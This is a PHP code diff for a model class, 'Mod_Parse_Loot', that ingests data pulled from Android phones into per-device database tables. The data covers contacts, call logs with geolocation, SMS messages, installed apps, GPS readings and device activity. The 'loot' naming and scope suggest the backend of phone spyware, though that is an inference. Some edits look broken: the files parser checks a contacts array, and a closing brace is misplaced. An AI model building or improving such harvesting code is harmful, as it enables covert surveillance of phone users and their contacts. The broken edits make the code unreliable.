@@ -14,7 +14,7 @@ class Mod_Parse_Loot extends Model
      * @param string $var_file_print
      * @return bool
      */
-    public function get_contacts(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null): bool
+    public function get_contacts(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
     {
         try {
             $cryptModel = new Mod_Crypt();
@@ -46,7 +46,7 @@ class Mod_Parse_Loot extends Model
                     continue; // Skip invalid entries
                 }
 
-$data = [
+            $data = [
                 'contact_id'         => $contact['id'],
                 'display_name'       => $contact['display_name'],
                 'phone_numbers'      => !empty($contact['phone_numbers']) ? json_encode($contact['phone_numbers']) : null,
@@ -57,7 +57,7 @@ $data = [
                 'companies'          => !empty($contact['companies']) ? json_encode($contact['companies']) : null,
                 'addresses'          => !empty($contact['addresses']) ? json_encode($contact['addresses']) : null,
                 'notes'              => $contact['notes'] ?? null,
-                'is_favorite'        => $contact['is_favorite'] ? 1 : 0,
+                'is_favorite'        => !empty($contact['is_favorite']) ? 1 : 0,
                 'last_contacted'     => $contact['last_time_contacted'] ?? null,
                 'contact_frequency'  => $contact['times_contacted'] ?? 0,
                 'contact_hash'       => $contact['contact_hash'] ?? null,
@@ -71,9 +71,9 @@ $data = [
                 'sip_address'        => $contact['sip_address'] ?? null,
                 'custom_fields'      => json_encode($contact['custom_fields'] ?? []),
                 'group_membership'   => json_encode($contact['group_membership'] ?? []),
-                'contact_last_updated' => $contact['contact_last_updated'] ?? null,
+                'contact_last_updated' => null, // deprecated on Android side — kept for DB compat
                 'raw_contact_account_type' => json_encode($contact['raw_contact_account_type'] ?? []),
-                'raw_contact_account_name' => (function() {
+                'raw_contact_account_name' => (function() use ($contact) {
                     $rawContacts = $contact['raw_contact_account_type'] ?? [];
                     if (!is_array($rawContacts)) return null;
                     $names = [];
@@ -87,11 +87,13 @@ $data = [
                 'sync_status'        => $contact['sync_status'] ?? null,
                 'is_restricted'      => isset($contact['is_restricted']) ? ($contact['is_restricted'] ? 1 : 0) : 0,
                 'photo_thumbnail_base64' => $contact['photo_thumbnail_base64'] ?? null,
-                'photo_file_id'      => $contact['photo_file_id'] ?? null,
+                'photo_file_id'      => !empty($contact['photo_file_id']) ? (int)$contact['photo_file_id'] : null,
                 'display_name_source' => $contact['display_name_source'] ?? null,
                 'phonetic_given_name' => $contact['phonetic_given_name'] ?? null,
                 'phonetic_family_name' => $contact['phonetic_family_name'] ?? null,
                 'transcription'      => $contact['transcription'] ?? null,
+                'communication_quality_score'    => isset($contact['communication_quality_score']) ? (float)$contact['communication_quality_score'] : null,
+                'communication_quality_category' => $contact['communication_quality_category'] ?? null,
                 'device_id'          => $var_file_print,
                 'extracted_at'       => $extracted_at,
                 'owner_id'           => $var_file_owner,
@@ -102,24 +104,41 @@ $data = [
                 'updated_at'         => $dated,
             ];
 
-                // Duplicate check using unique constraint fields
-                $exists = $this->db->table('tbl_contacts')
-                        ->where('contact_id', $data['contact_id'])
-                        ->where('device_id', $data['device_id'])
-                        ->where('owner_id', $data['owner_id'])
-                        ->countAllResults() > 0;
+            // Enforce only unique contacts insertion (check if display_name and phone_numbers already exist for owner)
+            $phoneNumbersJson = $data['phone_numbers'];
+            $existsQuery = $this->db->table('tbl_contacts')
+                ->where('owner_id', $data['owner_id'])
+                ->where('display_name', $data['display_name']);
+            if ($phoneNumbersJson !== null) {
+                $existsQuery->where('phone_numbers', $phoneNumbersJson);
+            } else {
+                $existsQuery->whereNull('phone_numbers');
+            }
+            $exists = $existsQuery->countAllResults() > 0;
 
-                if (!$exists) {
+            if (!$exists) {
+                // Ensure we don't insert duplicate keys within the same batch upload
+                $isDuplicateInBatch = false;
+                foreach ($batchData as $existingBatchItem) {
+                    if ($existingBatchItem['display_name'] === $data['display_name'] && 
+                        $existingBatchItem['phone_numbers'] === $data['phone_numbers'] &&
+                        $existingBatchItem['owner_id'] === $data['owner_id']) {
+                        $isDuplicateInBatch = true;
+                        break;
+                    }
+                }
+                if (!$isDuplicateInBatch) {
                     $batchData[] = $data;
                 }
             }
+        } // end foreach $json['contacts']
 
-            if (!empty($batchData)) {
-                $this->db->table('tbl_contacts')->insertBatch($batchData);
-                log_message('info', 'Batch inserted ' . count($batchData) . ' contacts from ' . $file_name);
-            }
+        if (!empty($batchData)) {
+            $this->db->table('tbl_contacts')->insertBatch($batchData);
+            log_message('info', 'Batch inserted ' . count($batchData) . ' contacts from ' . $file_name);
+        }
 
-            return true;
+        return count($batchData);
         } catch (\Exception $e) {
             log_message('error', 'get_contacts parse error for ' . $file_name . ': ' . $e->getMessage());
             return false;
@@ -134,7 +153,7 @@ $data = [
      * @param string $var_file_print
      * @return bool
      */
-    public function get_logs(string $file_name, int $var_file_owner, string $var_file_print): bool
+    public function get_logs(string $file_name, int $var_file_owner, string $var_file_print)
     {
         try {
             $cryptModel = new Mod_Crypt();
@@ -191,11 +210,12 @@ $data = [
                     'number_label'        => $log['number_label'] ?? null,
                     'number_type'         => $log['number_type'] ?? 0,
                     'matched_number'      => $log['matched_number'] ?? null,
-                    'is_read'             => $log['is_read'] ?? false,
+                    'is_read'             => !empty($log['is_read']) ? 1 : 0,
                     'features'            => $log['features'] ?? 0,
                     'data_usage'          => $log['data_usage'] ?? 0,
                     'phone_account_component_name' => $log['phone_account_component_name'] ?? null,
                     'phone_account_id'    => $log['phone_account_id'] ?? null,
+                    'geolocation'         => $log['geocoded_location'] ?? null,
                     'is_conference'       => $log['is_conference'] ?? 0,
                     'conference_participants' => json_encode($log['conference_participants'] ?? []),
                     'parent_call_id'      => $log['parent_call_id'] ?? 0,
@@ -231,23 +251,39 @@ $data = [
                         ->countAllResults() > 0;
 
                 if (!$exists) {
-                $batchData[] = $logData;
-            } else {
-                $duplicateCount++;
-                log_message('debug', 'Duplicate call log detected: ' . $logData['phone_number'] . ' at ' . $logData['call_date']);
+                    $isDuplicateInBatch = false;
+                    foreach ($batchData as $existingBatchItem) {
+                        if ($existingBatchItem['phone_number'] === $logData['phone_number'] && 
+                            $existingBatchItem['call_date'] === $logData['call_date'] &&
+                            $existingBatchItem['duration_seconds'] === $logData['duration_seconds'] &&
+                            $existingBatchItem['call_type'] === $logData['call_type'] &&
+                            $existingBatchItem['device_id'] === $logData['device_id'] &&
+                            $existingBatchItem['owner_id'] === $logData['owner_id']) {
+                            $isDuplicateInBatch = true;
+                            break;
+                        }
+                    }
+                    if (!$isDuplicateInBatch) {
+                        $batchData[] = $logData;
+                    } else {
+                        $duplicateCount++;
+                    }
+                } else {
+                    $duplicateCount++;
+                    log_message('debug', 'Duplicate call log detected: ' . $logData['phone_number'] . ' at ' . $logData['call_date']);
+                }
             }
-        }
 
-        log_message('info', 'Call logs processing summary - Total: ' . count($json['call_logs']) . ', Skipped: ' . $skippedCount . ', Duplicates: ' . $duplicateCount . ', New: ' . count($batchData));
+            log_message('info', 'Call logs processing summary - Total: ' . count($callLogData) . ', Skipped: ' . $skippedCount . ', Duplicates: ' . $duplicateCount . ', New: ' . count($batchData));
 
-        if (!empty($batchData)) {
-            $this->db->table('tbl_logs')->insertBatch($batchData);
-            log_message('info', 'Batch inserted ' . count($batchData) . ' call logs from ' . $file_name);
-        } else {
-            log_message('warning', 'No new call logs to insert from ' . $file_name);
-        }
+            if (!empty($batchData)) {
+                $this->db->table('tbl_logs')->insertBatch($batchData);
+                log_message('info', 'Batch inserted ' . count($batchData) . ' call logs from ' . $file_name);
+            } else {
+                log_message('warning', 'No new call logs to insert from ' . $file_name);
+            }
 
-            return true;
+            return count($batchData);
         } catch (\Exception $e) {
             log_message('error', 'get_logs parse error for ' . $file_name . ': ' . $e->getMessage());
             return false;
@@ -261,7 +297,7 @@ $data = [
      * @param string $var_file_print
      * @return bool
      */
-    public function get_apps(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null): bool
+    public function get_apps(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
     {
         try {
             $cryptModel = new Mod_Crypt();
@@ -421,7 +457,7 @@ $data = [
                 log_message('info', 'Batch inserted ' . count($batchData) . ' apps from ' . $file_name);
             }
 
-            return true;
+            return count($batchData);
         } catch (\Exception $e) {
             log_message('error', 'get_apps parse error for ' . $file_name . ': ' . $e->getMessage());
             return false;
@@ -436,7 +472,7 @@ $data = [
      * @param string $var_file_print
      * @return bool
      */
-    public function get_sms(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null): bool
+    public function get_sms(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
     {
         try {
             $cryptModel   = new Mod_Crypt();
@@ -476,6 +512,7 @@ $data = [
             $smsList      = $json['sms'];
             $batchSize    = 500; // Safe batch size
             $batch        = [];
+            $inserted     = 0;
 
             /* ---------------------------------------------------------
              * Loop until ALL SMS are processed
@@ -579,6 +616,7 @@ $data = [
                  * ----------------------------------------------------- */
                 if (count($batch) >= $batchSize) {
                     $this->db->table('tbl_sms')->insertBatch($batch);
+                    $inserted += count($batch);
                     $batch = [];
                 }
             }
@@ -588,14 +626,15 @@ $data = [
              * --------------------------------------------------------- */
             if (!empty($batch)) {
                 $this->db->table('tbl_sms')->insertBatch($batch);
+                $inserted += count($batch);
             }
 
             log_message(
                 'info',
-                'SMS import completed for ' . $file_name . ' (' . count($smsList) . ' records processed)'
+                'SMS import completed for ' . $file_name . ' (' . $inserted . ' records inserted from ' . count($smsList) . ')'
             );
 
-            return true;
+            return $inserted;
 
         } catch (\Throwable $e) {
             log_message(
@@ -638,8 +677,17 @@ $data = [
                 log_message('error', 'Invalid JSON structure in files file: ' . $file_name);
                 return false;
             }
-
             $extracted_at = $json['extracted_at'] ?? null;
+
+            if (!empty($json['extraction_error'])) {
+                log_message('warning', 'get_contacts: Android extractor reported an error: ' . $json['extraction_error'] . ' (file: ' . $file_name . ')');
+            }
+
+            if (empty($json['contacts']) || !is_array($json['contacts'])) {
+                log_message('info', 'get_contacts: empty contacts array in file: ' . $file_name);
+                return 0;
+            }
+
             $batchData = [];
 
             foreach ($json['files'] as $file) {
@@ -873,6 +921,7 @@ $data = [
             'pdop'                  => $loc['pdop'] ?? 0,
             'gnss_status'           => $loc['gnss_status'] ?? null,
             'nmea_sentence'         => $loc['nmea_sentence'] ?? null,
+            'fetched_at'    => $loc['fetched_at'] ?? null,
             'extracted_at'  => $extractedAt ?? $loc['fetched_at'] ?? null,
             'created_at'    => $dated,
             'updated_at'    => $dated
@@ -903,6 +952,7 @@ $data = [
             'charging_status'=> $act['charging_status'] ?? null,
             'network_type'   => $act['network_type'] ?? null,
             'screen_on'      => isset($act['screen_on']) ? ($act['screen_on'] ? 1 : 0) : 0,
+            'fetched_at'     => $act['fetched_at'] ?? null,
             'extracted_at'   => $extractedAt ?? $act['fetched_at'] ?? null,
             'activity_time'  => $act['activity_time'] ?? null,
             'created_at'     => $dated,
